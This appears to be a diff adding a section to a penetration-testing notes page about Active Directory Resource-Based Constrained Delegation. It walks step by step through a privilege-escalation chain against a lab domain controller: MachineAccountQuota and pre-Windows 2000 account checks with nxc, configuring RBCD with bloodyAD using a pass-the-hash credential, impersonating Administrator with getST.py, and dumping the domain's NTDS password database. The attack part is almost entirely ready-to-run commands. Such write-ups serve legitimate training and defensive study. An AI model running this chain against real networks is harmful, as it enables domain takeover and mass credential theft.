@@ -7,6 +7,61 @@ metaLinks:
 
 # Resource Based Constrained Delegation
 
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+### Terence.white have WriteAccountRestrictions
+
+Using WriteAccountRestrictions, attackers configure Resource-Based Constrained Delegation (RBCD) on the RODC system, enabling impersonation of privileged users such as Administrator.
+
+#### RBCD Privesc
+
+We check MachineAccountQuota
+
+{% code overflow="wrap" %}
+```bash
+nxc ldap 192.168.178.187 -u 'alex.turner' -p 'alex1988' -M maq
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+We check for pre-Windows 2000 accounts
+
+{% code overflow="wrap" %}
+```bash
+nxc ldap 192.168.178.187 -u 'alex.turner' -p 'alex1988' -M pre2k
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+We configure RBCD on the domain controller
+
+{% code overflow="wrap" %}
+```bash
+bloodyAD --host 192.168.178.187 -d grandstay.local -u 'terence.white' -p :e4a22d8e7bbec871b341c88c2e94cba2  add rbcd 'DC01$' 'RECEPTION$'
+```
+{% endcode %}
+
+We impersonate Administrator via Kerberos delegation
+
+{% code overflow="wrap" %}
+```bash
+getST.py -spn cifs/DC01.grandstay.local -impersonate Administrator -dc-ip 192.168.178.187 'grandstay.local/RECEPTION$:reception'
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```bash
+export KRB5CCNAME=Administrator@cifs_DC01.grandstay.local@GRANDSTAY.LOCAL.ccache
+nxc smb 192.168.178.187 -k --use-kcache -u Administrator --ntds
+```
+{% endcode %}
+
+
+
 ## Abuse by Windows System
 
 We can use this attack vector with <mark style="color:red;">**GenericAll**</mark>, <mark style="color:red;">**WriteProperty**</mark>, or <mark style="color:red;">**WriteDACL**</mark> access rights.
